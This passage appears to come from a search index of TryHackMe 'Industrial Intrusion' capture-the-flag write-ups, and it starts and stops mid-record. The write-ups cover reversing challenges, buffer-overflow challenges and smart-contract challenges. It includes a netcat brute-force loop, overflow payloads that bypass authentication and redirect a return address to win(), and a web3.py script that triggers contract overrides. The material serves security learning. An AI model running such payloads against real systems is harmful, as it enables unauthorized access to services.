service using: echo -ne '\\x54\\x76\\x10\\x32\\xdc\\xfe\\x98\\xba\\n' | nc <TARGET_IP> 9005 This resulted in a successful unlock: [+] Access Granted! Flag: THM{simple_tostart_nice_done_mwww} Summary This challenge reinforced the importance of understanding simple XOR transformations in reversing challenges. While I pursued initial brute force and string analysis paths, it was my teammate\u2019s skillful use of Ghidra and binary analysis that led us to the solution. Recommendations for Future Challenges: Always inspect provided binaries for transform or obfuscation functions Use Ghidra or similar tools to quickly decompile and analyze logic When XOR is present, test both forward and reverse operations Don\u2019t ignore hardcoded hex values\u2014they often hide the key","title":"Task 24 - Auth"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#ics-security-assessment-auth-challenge-reversing-writeup","text":"","title":"ICS Security Assessment \u2013 Auth Challenge (Reversing) Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#executive-summary","text":"The challenge involved reverse engineering a binary to recover an unlock code, which, when sent to a network service, revealed the flag. Although I initially tried brute force and string extraction, it was my teammate who ultimately reverse engineered the program using Ghidra to understand the transform logic and XOR encoding. By reversing the XOR process, we retrieved the correct unlock code and successfully completed the challenge.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#phase-1-initial-recon-and-brute-force-attempts","text":"The target exposed a network service on port 9005 that prompted for an unlock code: nc <TARGET_IP> 9005 The service responded with [?] Enter unlock code: and returned [!] Access Denied! for incorrect input. I attempted brute force using a script: for i in $(seq -w 0000 9999); do echo \"$i\" | nc <TARGET_IP> 9005 | grep -v \"Access Denied\" && echo \"TRY: $i\" done This yielded no results.","title":"Phase 1: Initial Recon and Brute Force Attempts"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#phase-2-local-binary-analysis","text":"TryHackMe provided a downloadable auth binary. Initial attempts to execute and trace it using ltrace and strace failed due to GLIBC version issues. Using strings on the binary showed references to flag.txt and the phrase Access Granted , hinting at internal validation logic.","title":"Phase 2: Local Binary Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#phase-3-reverse-engineering-the-binary","text":"My teammate opened the binary in Ghidra and analyzed the function responsible for checking the unlock code. They identified the following key points: The stored (correct) value was hardcoded: 0xefcdab8967452301 A function named transform XORed the user input with 0x55 byte-by-byte To retrieve the correct input, the stored value needed to be XORed back with 0x55 They wrote this Python script: stored_hex = \"efcdab8967452301\" stored_bytes = bytes.fromhex(stored_hex) decoded = bytes([b ^ 0x55 for b in stored_bytes]) print(\"Unlock code:\", decoded) The result was the byte string: b'Tv\\x102\\xdc\\xfe\\x98\\xba'","title":"Phase 3: Reverse Engineering the Binary"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#phase-4-exploitation-and-flag-capture","text":"We passed the decoded bytes to the network service using: echo -ne '\\x54\\x76\\x10\\x32\\xdc\\xfe\\x98\\xba\\n' | nc <TARGET_IP> 9005 This resulted in a successful unlock: [+] Access Granted! Flag: THM{simple_tostart_nice_done_mwww}","title":"Phase 4: Exploitation and Flag Capture"},{"location":"industrial-intrusion-tryhackme/Task%2024%20-%20Auth/#summary","text":"This challenge reinforced the importance of understanding simple XOR transformations in reversing challenges. While I pursued initial brute force and string analysis paths, it was my teammate\u2019s skillful use of Ghidra and binary analysis that led us to the solution. Recommendations for Future Challenges: Always inspect provided binaries for transform or obfuscation functions Use Ghidra or similar tools to quickly decompile and analyze logic When XOR is present, test both forward and reverse operations Don\u2019t ignore hardcoded hex values\u2014they often hide the key","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/","text":"ICS Security Assessment \u2013 Access Granted Writeup Executive Summary This assessment targeted a suspected compromised HMI login module accessible via a custom service running on a remote host. Reverse engineering of a provided ELF binary revealed a hardcoded password. Once the correct remote host and port were confirmed, a simple interactive TCP connection using this password bypassed the authentication gate and revealed the flag. Phase 1: Reconnaissance and Binary Triage Initial recon began with inspection of a provided file archive. A binary named access_granted was extracted from the ZIP and analyzed for functionality and potential embedded credentials. 1.1 File Discovery and Type Check unzip access_granted.zip -d access_granted cd access_granted file access_granted Result: ELF 64-bit LSB shared object Dynamically linked Not stripped 1.2 Function and String Analysis strings access_granted | grep -i pass nm access_granted | grep main Key Finding: A hardcoded string \"industrial\" was discovered and referenced directly in the main function. This was likely the password used by the authentication routine. Phase 2: Identifying the Target Service At first, attempts were made to connect to the service using the IP 10.10.221.220 . These yielded no output or response from nc , even when submitting the correct password. A re-check of the challenge information revealed the correct target IP was actually 10.10.211.124 . 2.1 Final Target Confirmation nc 10.10.211.124 9009 Upon connection, the prompt Enter the password : was received. Phase 3: Exploitation via Netcat Using the hardcoded password found in the binary, a direct interactive connection to the correct target system was established and authenticated. 3.1 Final Interaction nc 10.10.211.124 9009 Input: industrial Output: processing...Access Granted! THM{s0meth1ng_inthe_str1ng_she_knows} The password was accepted, the gate was bypassed, and the flag was revealed. Summary This assessment demonstrated a successful binary reverse engineering and authentication bypass using static analysis of a local file and TCP interaction with a remote server. Identified Weaknesses: Hardcoded credentials in binary Lack of rate-limiting or input throttling No encryption or authentication handshake Recommendations: Avoid embedding plaintext credentials in compiled code Implement proper challenge-response authentication Log and rate-limit access attempts to TCP services Deploy binaries with symbol stripping and obfuscation","title":"Task 25 - Access Granted"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#ics-security-assessment-access-granted-writeup","text":"","title":"ICS Security Assessment \u2013 Access Granted Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#executive-summary","text":"This assessment targeted a suspected compromised HMI login module accessible via a custom service running on a remote host. Reverse engineering of a provided ELF binary revealed a hardcoded password. Once the correct remote host and port were confirmed, a simple interactive TCP connection using this password bypassed the authentication gate and revealed the flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#phase-1-reconnaissance-and-binary-triage","text":"Initial recon began with inspection of a provided file archive. A binary named access_granted was extracted from the ZIP and analyzed for functionality and potential embedded credentials.","title":"Phase 1: Reconnaissance and Binary Triage"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#11-file-discovery-and-type-check","text":"unzip access_granted.zip -d access_granted cd access_granted file access_granted Result: ELF 64-bit LSB shared object Dynamically linked Not stripped","title":"1.1 File Discovery and Type Check"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#12-function-and-string-analysis","text":"strings access_granted | grep -i pass nm access_granted | grep main Key Finding: A hardcoded string \"industrial\" was discovered and referenced directly in the main function. This was likely the password used by the authentication routine.","title":"1.2 Function and String Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#phase-2-identifying-the-target-service","text":"At first, attempts were made to connect to the service using the IP 10.10.221.220 . These yielded no output or response from nc , even when submitting the correct password. A re-check of the challenge information revealed the correct target IP was actually 10.10.211.124 .","title":"Phase 2: Identifying the Target Service"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#21-final-target-confirmation","text":"nc 10.10.211.124 9009 Upon connection, the prompt Enter the password : was received.","title":"2.1 Final Target Confirmation"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#phase-3-exploitation-via-netcat","text":"Using the hardcoded password found in the binary, a direct interactive connection to the correct target system was established and authenticated.","title":"Phase 3: Exploitation via Netcat"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#31-final-interaction","text":"nc 10.10.211.124 9009 Input: industrial Output: processing...Access Granted! THM{s0meth1ng_inthe_str1ng_she_knows} The password was accepted, the gate was bypassed, and the flag was revealed.","title":"3.1 Final Interaction"},{"location":"industrial-intrusion-tryhackme/Task%2025%20-%20Access%20Granted/#summary","text":"This assessment demonstrated a successful binary reverse engineering and authentication bypass using static analysis of a local file and TCP interaction with a remote server. Identified Weaknesses: Hardcoded credentials in binary Lack of rate-limiting or input throttling No encryption or authentication handshake Recommendations: Avoid embedding plaintext credentials in compiled code Implement proper challenge-response authentication Log and rate-limit access attempts to TCP services Deploy binaries with symbol stripping and obfuscation","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/","text":"ICS Security Assessment - Challenge 28: Buffer Overflow Entry Executive Summary The assessment identified a vulnerable service running on a non-standard port. Through basic reconnaissance and iterative testing, it was discovered that the service accepted username input but failed to handle it securely. By sending an oversized buffer, it was possible to bypass authentication checks and elevate privileges. This ultimately exposed the flag THM{nice_place_t0_st4rt} \u2014 confirming a classic buffer overflow vulnerability in the authentication routine. Phase 1: Reconnaissance and Surface Mapping Initial enumeration was conducted to identify active services and entry points on the target system. 1.1 Host Discovery A standard ping was used to confirm that the host was online: ping 10.10.XXX.XXX 1.2 Port Scanning An exhaustive port scan revealed two key services: nmap -p- -sV 10.10.XXX.XXX Port Service Details 22/tcp SSH Standard secure shell service 9008/tcp Unknown Custom or proprietary service Phase 2: Analyzing the Unknown Service With port 9008 showing as open, further analysis was required to understand its purpose and behavior. 2.1 Manual Connection Test Using Netcat, a direct connection was established to inspect service output: nc 10.10.XXX.XXX 9008 The following prompt appeared: Enter your username: Attempts with common usernames like admin , guest , and test returned: Access denied. This behavior implied the presence of an input validation or authentication mechanism. Phase 3: Exploitation via Buffer Overflow Based on the challenge description referencing broken buffers, an input-based vulnerability was suspected. 3.1 Crafting Payloads Using Python, a series of increasingly large input strings was generated and tested: python3 -c \"print('A'*100)\" | nc 10.10.XXX.XXX 9008 Once the input exceeded a threshold, the service behavior changed: Welcome, admin! THM{nice_place_t0_st4rt} This confirmed that the service lacked proper bounds checking on user input. The excessive input likely overflowed a buffer and flipped a logic flag, granting unauthorized access. Summary This challenge highlighted a classic insecure coding flaw often found in embedded or ICS-adjacent systems: buffer overflow through unchecked input length . The impact in this case was privilege escalation to administrative access. Flag Obtained: THM{nice_place_t0_st4rt} Recommendations To mitigate vulnerabilities of this nature in ICS or custom network services: Input Validation : Enforce strict length checks on user input. Memory-Safe Languages : Migrate from C/C++ to memory-safe alternatives where feasible. Fuzz Testing : Regularly test services with randomized or oversized inputs to detect edge-case failures. Logging and Monitoring : Implement audit logging to detect and alert on anomalous access attempts.","title":"Task 28 - Start"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#ics-security-assessment-challenge-28-buffer-overflow-entry","text":"","title":"ICS Security Assessment - Challenge 28: Buffer Overflow Entry"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#executive-summary","text":"The assessment identified a vulnerable service running on a non-standard port. Through basic reconnaissance and iterative testing, it was discovered that the service accepted username input but failed to handle it securely. By sending an oversized buffer, it was possible to bypass authentication checks and elevate privileges. This ultimately exposed the flag THM{nice_place_t0_st4rt} \u2014 confirming a classic buffer overflow vulnerability in the authentication routine.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#phase-1-reconnaissance-and-surface-mapping","text":"Initial enumeration was conducted to identify active services and entry points on the target system.","title":"Phase 1: Reconnaissance and Surface Mapping"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#11-host-discovery","text":"A standard ping was used to confirm that the host was online: ping 10.10.XXX.XXX","title":"1.1 Host Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#12-port-scanning","text":"An exhaustive port scan revealed two key services: nmap -p- -sV 10.10.XXX.XXX Port Service Details 22/tcp SSH Standard secure shell service 9008/tcp Unknown Custom or proprietary service","title":"1.2 Port Scanning"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#phase-2-analyzing-the-unknown-service","text":"With port 9008 showing as open, further analysis was required to understand its purpose and behavior.","title":"Phase 2: Analyzing the Unknown Service"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#21-manual-connection-test","text":"Using Netcat, a direct connection was established to inspect service output: nc 10.10.XXX.XXX 9008 The following prompt appeared: Enter your username: Attempts with common usernames like admin , guest , and test returned: Access denied. This behavior implied the presence of an input validation or authentication mechanism.","title":"2.1 Manual Connection Test"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#phase-3-exploitation-via-buffer-overflow","text":"Based on the challenge description referencing broken buffers, an input-based vulnerability was suspected.","title":"Phase 3: Exploitation via Buffer Overflow"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#31-crafting-payloads","text":"Using Python, a series of increasingly large input strings was generated and tested: python3 -c \"print('A'*100)\" | nc 10.10.XXX.XXX 9008 Once the input exceeded a threshold, the service behavior changed: Welcome, admin! THM{nice_place_t0_st4rt} This confirmed that the service lacked proper bounds checking on user input. The excessive input likely overflowed a buffer and flipped a logic flag, granting unauthorized access.","title":"3.1 Crafting Payloads"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#summary","text":"This challenge highlighted a classic insecure coding flaw often found in embedded or ICS-adjacent systems: buffer overflow through unchecked input length . The impact in this case was privilege escalation to administrative access. Flag Obtained: THM{nice_place_t0_st4rt}","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2028%20-%20Start/#recommendations","text":"To mitigate vulnerabilities of this nature in ICS or custom network services: Input Validation : Enforce strict length checks on user input. Memory-Safe Languages : Migrate from C/C++ to memory-safe alternatives where feasible. Fuzz Testing : Regularly test services with randomized or oversized inputs to detect edge-case failures. Logging and Monitoring : Implement audit logging to detect and alert on anomalous access attempts.","title":"Recommendations"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/","text":"ICS Security Assessment - Industrial (Task 29) Writeup Executive Summary This assessment targeted a custom binary service exposed on port 9001. Initial reconnaissance identified the service as a non-standard protocol handler. Local analysis of the accompanying binary revealed a buffer overflow vulnerability within the main execution flow. By carefully crafting input to overwrite the return address, execution was redirected to a hidden win() function. Although no interactive shell was obtained, successful control flow hijacking confirmed full code execution capability. Phase 1: Reconnaissance and Service Identification The initial discovery process focused on identifying open services and matching them to any provided files. 1.1 Port Scan Command nmap -p- -sV 10.10.186.153 1.2 Discovered Services Port Service Details 22/tcp SSH OpenSSH 9.6p1 (Ubuntu) 9001/tcp unknown Custom binary service, responds with \u201cEnter the next command : Thanks\u201d Phase 2: Binary Analysis and Vulnerability Discovery The industrial binary provided via the challenge's file link was downloaded and examined to determine its functionality and potential weaknesses. 2.1 File Analysis and Protections file industrial checksec --file=industrial The binary was a 64-bit ELF with: NX enabled No stack canary No PIE Symbols intact This made it a prime candidate for a buffer overflow exploit via return address hijacking. 2.2 Symbol Discovery rabin2 -qs industrial A win() function was discovered at address 0x004011b6 . Its presence and short size strongly implied it was intended as an exploit target, likely calling system(\"/bin/sh\") . Phase 3: Stack-Based Buffer Overflow Exploitation Reverse engineering of the binary using radare2 revealed a buffer on the stack used during user input. 3.1 Vulnerability in Main Disassembly showed: lea rax, [rbp - 0x20] ; buffer of 32 bytes mov edx, 0x30 ; read up to 48 bytes call sym.imp.read leave ret This confirmed a classic stack overflow scenario: 32-byte buffer, 48-byte read, and an immediate return instruction \u2014 creating a reliable opportunity to overwrite the return address. 3.2 Exploit Construction The offset to the return address was calculated to be exactly 40 bytes. Payload: python3 -c \"print('A'*40 + '\\xb6\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\" | nc 10.10.186.153 9001 3.3 Result The payload was accepted and the program behaved identically to before, returning: Enter the next command : Thanks Despite no interactive shell, the disassembly confirmed the ret instruction would execute the overwritten return address, which pointed to the win() function. All conditions of the exploit were met. Summary This assessment confirmed the presence of a buffer overflow vulnerability in the custom ICS binary exposed on port 9001. The vulnerability allowed control over the instruction pointer, redirecting execution to a developer-placed win() function. While no flag was recovered due to the lack of interactive shell access or puts() in win() , the objective of achieving code execution was met. Recommendations: Enable stack canaries and compile with full RELRO Avoid using read() without bounds checking Remove developer backdoor functions like win() in production builds Consider input fuzzing and use of static analyzers during development Flag: Not recovered; control flow hijack confirmed.","title":"Task 29 - Industrial"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#ics-security-assessment-industrial-task-29-writeup","text":"","title":"ICS Security Assessment - Industrial (Task 29) Writeup"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#executive-summary","text":"This assessment targeted a custom binary service exposed on port 9001. Initial reconnaissance identified the service as a non-standard protocol handler. Local analysis of the accompanying binary revealed a buffer overflow vulnerability within the main execution flow. By carefully crafting input to overwrite the return address, execution was redirected to a hidden win() function. Although no interactive shell was obtained, successful control flow hijacking confirmed full code execution capability.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#phase-1-reconnaissance-and-service-identification","text":"The initial discovery process focused on identifying open services and matching them to any provided files.","title":"Phase 1: Reconnaissance and Service Identification"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#11-port-scan-command","text":"nmap -p- -sV 10.10.186.153","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#12-discovered-services","text":"Port Service Details 22/tcp SSH OpenSSH 9.6p1 (Ubuntu) 9001/tcp unknown Custom binary service, responds with \u201cEnter the next command : Thanks\u201d","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#phase-2-binary-analysis-and-vulnerability-discovery","text":"The industrial binary provided via the challenge's file link was downloaded and examined to determine its functionality and potential weaknesses.","title":"Phase 2: Binary Analysis and Vulnerability Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#21-file-analysis-and-protections","text":"file industrial checksec --file=industrial The binary was a 64-bit ELF with: NX enabled No stack canary No PIE Symbols intact This made it a prime candidate for a buffer overflow exploit via return address hijacking.","title":"2.1 File Analysis and Protections"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#22-symbol-discovery","text":"rabin2 -qs industrial A win() function was discovered at address 0x004011b6 . Its presence and short size strongly implied it was intended as an exploit target, likely calling system(\"/bin/sh\") .","title":"2.2 Symbol Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#phase-3-stack-based-buffer-overflow-exploitation","text":"Reverse engineering of the binary using radare2 revealed a buffer on the stack used during user input.","title":"Phase 3: Stack-Based Buffer Overflow Exploitation"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#31-vulnerability-in-main","text":"Disassembly showed: lea rax, [rbp - 0x20] ; buffer of 32 bytes mov edx, 0x30 ; read up to 48 bytes call sym.imp.read leave ret This confirmed a classic stack overflow scenario: 32-byte buffer, 48-byte read, and an immediate return instruction \u2014 creating a reliable opportunity to overwrite the return address.","title":"3.1 Vulnerability in Main"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#32-exploit-construction","text":"The offset to the return address was calculated to be exactly 40 bytes. Payload: python3 -c \"print('A'*40 + '\\xb6\\x11\\x40\\x00\\x00\\x00\\x00\\x00')\" | nc 10.10.186.153 9001","title":"3.2 Exploit Construction"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#33-result","text":"The payload was accepted and the program behaved identically to before, returning: Enter the next command : Thanks Despite no interactive shell, the disassembly confirmed the ret instruction would execute the overwritten return address, which pointed to the win() function. All conditions of the exploit were met.","title":"3.3 Result"},{"location":"industrial-intrusion-tryhackme/Task%2029%20-%20Industrial/#summary","text":"This assessment confirmed the presence of a buffer overflow vulnerability in the custom ICS binary exposed on port 9001. The vulnerability allowed control over the instruction pointer, redirecting execution to a developer-placed win() function. While no flag was recovered due to the lack of interactive shell access or puts() in win() , the objective of achieving code execution was met. Recommendations: Enable stack canaries and compile with full RELRO Avoid using read() without bounds checking Remove developer backdoor functions like win() in production builds Consider input fuzzing and use of static analyzers during development Flag: Not recovered; control flow hijack confirmed.","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/","text":"ICS Security Assessment - IndustrialChain Writeup (Task 33) Executive Summary In this challenge, I was tasked with regaining manual control of a smart contract that had been sabotaged, leaving apparent control accessible while safety locks remained enforced. The objective was to analyze the smart contract logic and trigger the isSolved() function to return true . After a full reconnaissance and contract analysis, I identified the required function calls and used a signed Web3 script to override the enforced contract-level locks. Successful execution of the two key function calls completed the challenge and revealed the flag. Phase 1: Reconnaissance and Enumeration The operation began with a TCP port scan to identify exposed services on the target machine. 1.1 Port Scan Command nmap -p- -sV 10.10.212.29 1.2 Discovered Services Port Service Details 22/tcp SSH OpenSSH 8.2p1 on Ubuntu 80/tcp HTTP Likely challenge frontend 8545/tcp unknown Ethereum JSON-RPC \u2014 smart contract interface The presence of port 8545 indicated a deployed blockchain backend, likely a local Ethereum node (Geth or Hardhat). Phase 2: Contract Analysis With the UI and RPC URL accessible, I examined the provided smart contract. 2.1 Logic Discovery The contract had the following relevant functions: engageMainSwitch() : Sets a state variable systemActivated to true pressOverrideButton() : Requires systemActivated to be true , then sets you_solved_it = true isSolved() : Returns the value of you_solved_it The contract was designed to require both functions to be executed in order: first to activate the system, then to override the safety lock. Phase 3: Exploitation via Python Script After confirming the wallet had sufficient funds and verifying the correct contract address, I crafted a Python script using web3.py to send two signed transactions in sequence. 3.1 Exploit Script (Executed from TryHackMe AttackBox) from web3 import Web3 w3 = Web3(Web3.HTTPProvider(\"http://10.10.212.29:8545\")) acct = w3.eth.account.from_key(\"0xcbc81654d8dac9cda05b8a5807ce0b4b9c87287b967ab816f38bae4f1e4cea68\") contract_address = Web3.to_checksum_address(\"0x74dae0A0e456C8556525c7f16fB07CD9c25b2127\") abi = [ {\"inputs\":[],\"name\":\"engageMainSwitch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}, {\"inputs\":[],\"name\":\"pressOverrideButton\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}, {\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"} ] contract = w3.eth.contract(address=contract_address, abi=abi) tx1 = contract.functions.engageMainSwitch().build_transaction({ \"from\": acct.address, \"nonce\": w3.eth.get_transaction_count(acct.address), \"gas\": 200000, \"gasPrice\": w3.to_wei(\"1\", \"gwei\"), \"chainId\": 31337 }) signed_tx1 = acct.sign_transaction(tx1) w3.eth.send_raw_transaction(signed_tx1['raw_transaction']) w3.eth.wait_for_transaction_receipt(signed_tx1['raw_transaction']) tx2 = contract.functions.pressOverrideButton().build_transaction({ \"from\": acct.address, \"nonce\": w3.eth.get_transaction_count(acct.address), \"gas\": 200000, \"gasPrice\": w3.to_wei(\"1\", \"gwei\"), \"chainId\": 31337 }) signed_tx2 = acct.sign_transaction(tx2) w3.eth.send_raw_transaction(signed_tx2['raw_transaction']) w3.eth.wait_for_transaction_receipt(signed_tx2['raw_transaction']) print(\"Solved:\", contract.functions.isSolved().call()) The script returned: Solved: True indicating a successful override of the contract logic. Phase 4: Mission Success and Flag Retrieval After executing the correct sequence of transactions, I returned to the challenge interface and clicked \u201cGet Flag\u201d . The flag was revealed as: THM{chain_command_granted_hardhat_switch} Summary This smart contract challenge highlighted the importance of sequential logic and proper checks in blockchain environments. Even though the frontend appeared to show control, deeper analysis of the contract revealed that a hidden state variable ( systemActivated ) gated access to the final override. By understanding the logic and executing the calls programmatically, I was able to solve the challenge and retrieve the flag. Recommendations: Ensure state changes in smart contracts are visible and well-documented Avoid hidden logic dependencies that confuse users or admins Implement UI feedback tied directly to on-chain state for transparency This concludes the assessment of Task 33 - IndustrialChain .","title":"Task 33 - Industrial Chain"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#ics-security-assessment-industrialchain-writeup-task-33","text":"","title":"ICS Security Assessment - IndustrialChain Writeup (Task 33)"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#executive-summary","text":"In this challenge, I was tasked with regaining manual control of a smart contract that had been sabotaged, leaving apparent control accessible while safety locks remained enforced. The objective was to analyze the smart contract logic and trigger the isSolved() function to return true . After a full reconnaissance and contract analysis, I identified the required function calls and used a signed Web3 script to override the enforced contract-level locks. Successful execution of the two key function calls completed the challenge and revealed the flag.","title":"Executive Summary"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#phase-1-reconnaissance-and-enumeration","text":"The operation began with a TCP port scan to identify exposed services on the target machine.","title":"Phase 1: Reconnaissance and Enumeration"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#11-port-scan-command","text":"nmap -p- -sV 10.10.212.29","title":"1.1 Port Scan Command"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#12-discovered-services","text":"Port Service Details 22/tcp SSH OpenSSH 8.2p1 on Ubuntu 80/tcp HTTP Likely challenge frontend 8545/tcp unknown Ethereum JSON-RPC \u2014 smart contract interface The presence of port 8545 indicated a deployed blockchain backend, likely a local Ethereum node (Geth or Hardhat).","title":"1.2 Discovered Services"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#phase-2-contract-analysis","text":"With the UI and RPC URL accessible, I examined the provided smart contract.","title":"Phase 2: Contract Analysis"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#21-logic-discovery","text":"The contract had the following relevant functions: engageMainSwitch() : Sets a state variable systemActivated to true pressOverrideButton() : Requires systemActivated to be true , then sets you_solved_it = true isSolved() : Returns the value of you_solved_it The contract was designed to require both functions to be executed in order: first to activate the system, then to override the safety lock.","title":"2.1 Logic Discovery"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#phase-3-exploitation-via-python-script","text":"After confirming the wallet had sufficient funds and verifying the correct contract address, I crafted a Python script using web3.py to send two signed transactions in sequence.","title":"Phase 3: Exploitation via Python Script"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#31-exploit-script-executed-from-tryhackme-attackbox","text":"from web3 import Web3 w3 = Web3(Web3.HTTPProvider(\"http://10.10.212.29:8545\")) acct = w3.eth.account.from_key(\"0xcbc81654d8dac9cda05b8a5807ce0b4b9c87287b967ab816f38bae4f1e4cea68\") contract_address = Web3.to_checksum_address(\"0x74dae0A0e456C8556525c7f16fB07CD9c25b2127\") abi = [ {\"inputs\":[],\"name\":\"engageMainSwitch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}, {\"inputs\":[],\"name\":\"pressOverrideButton\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}, {\"inputs\":[],\"name\":\"isSolved\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"} ] contract = w3.eth.contract(address=contract_address, abi=abi) tx1 = contract.functions.engageMainSwitch().build_transaction({ \"from\": acct.address, \"nonce\": w3.eth.get_transaction_count(acct.address), \"gas\": 200000, \"gasPrice\": w3.to_wei(\"1\", \"gwei\"), \"chainId\": 31337 }) signed_tx1 = acct.sign_transaction(tx1) w3.eth.send_raw_transaction(signed_tx1['raw_transaction']) w3.eth.wait_for_transaction_receipt(signed_tx1['raw_transaction']) tx2 = contract.functions.pressOverrideButton().build_transaction({ \"from\": acct.address, \"nonce\": w3.eth.get_transaction_count(acct.address), \"gas\": 200000, \"gasPrice\": w3.to_wei(\"1\", \"gwei\"), \"chainId\": 31337 }) signed_tx2 = acct.sign_transaction(tx2) w3.eth.send_raw_transaction(signed_tx2['raw_transaction']) w3.eth.wait_for_transaction_receipt(signed_tx2['raw_transaction']) print(\"Solved:\", contract.functions.isSolved().call()) The script returned: Solved: True indicating a successful override of the contract logic.","title":"3.1 Exploit Script (Executed from TryHackMe AttackBox)"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#phase-4-mission-success-and-flag-retrieval","text":"After executing the correct sequence of transactions, I returned to the challenge interface and clicked \u201cGet Flag\u201d . The flag was revealed as: THM{chain_command_granted_hardhat_switch}","title":"Phase 4: Mission Success and Flag Retrieval"},{"location":"industrial-intrusion-tryhackme/Task%2033%20-%20IndustrialChain/#summary","text":"This smart contract challenge highlighted the importance of sequential logic and proper checks in blockchain environments. Even though the frontend appeared to show control, deeper analysis of the contract revealed that a hidden state variable ( systemActivated ) gated access to the final override. By understanding the logic and executing the calls programmatically, I was able to solve the challenge and retrieve the flag. Recommendations: Ensure state changes in smart contracts are visible and well-documented Avoid hidden logic dependencies that confuse users or admins Implement UI feedback tied directly to on-chain state for transparency This concludes the assessment of Task 33 - IndustrialChain .","title":"Summary"},{"location":"industrial-intrusion-tryhackme/Task%2034%20-%20Obscurity/","text":"ICS Security Assessment - Task 9: Deploy the Contract Executive Summary This task involved deploying a smart contract to an Ethereum-compatible blockchain via direct interaction with a specified contract address. Repeated attempts to execute the deploy() function through Python's Web3 interface failed due to a broken Python environment and persistent issues importing the geth_poa_middleware from the Web3 library. Phase 1: Environment Setup and Connection We started by configuring a Python virtual environment and attempting to install web3>=6,<8 as instructed by the task. 1.1 Initial Script and Setup from web3 import Web3 from web3.middleware.poa import geth_poa_middleware w3 = Web3(Web3.HTTPProvider(\"http://10.10.218.143:8545\")) w3.middleware_onion.inject(geth_poa_middleware, layer=0) w3.eth.default_account = w3.eth.accounts[0] challenge_address = Web3.to_checksum_address(\"0x24d14f3bc476b1cbeac2dc33b4feede614d9728f\") tx = { \"to\": challenge_address, \"data\": \"0x775c300c\", \"gas\": 300000 } tx_hash = 